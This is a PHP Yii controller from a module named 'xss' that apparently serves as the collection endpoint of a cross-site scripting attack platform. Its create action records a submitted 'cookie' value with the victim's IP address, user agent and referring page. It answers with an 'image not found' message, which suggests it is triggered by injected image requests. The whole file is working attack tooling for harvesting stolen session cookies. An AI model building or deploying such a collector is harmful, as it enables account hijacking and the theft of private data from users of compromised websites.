<?php

namespace frontend\modules\xss\controllers;

use frontend\modules\xss\models\XssCookie;
use Yii;
use yii\helpers\VarDumper;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

/**
 * CookieController implements the CRUD actions for XssCookie model.
 */
class CookieController extends Controller
{

    /**
     * Creates a new XssCookie model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($cookie,$siteId = 0)
    {


        $model = new XssCookie();


        if($cookie) {


            $model->sites_id = $siteId;
            $model->cookie = $cookie;
            $model->from_ip = Yii::$app->getRequest()->getUserIP();
            $model->user_agent = Yii::$app->getRequest()->getUserAgent();
            $model->from_url = Yii::$app->getRequest()->getReferrer();
            $model->is_mobile = 0;

        }



//        VarDumper::dump($model->validate(),3,3);
//        VarDumper::dump($model,3,3);
//        exit;

        if($model->save()) {
            echo 'Success, but image not found';
        }
        else {
            echo 'Error, but image not found';
        }

    }
}
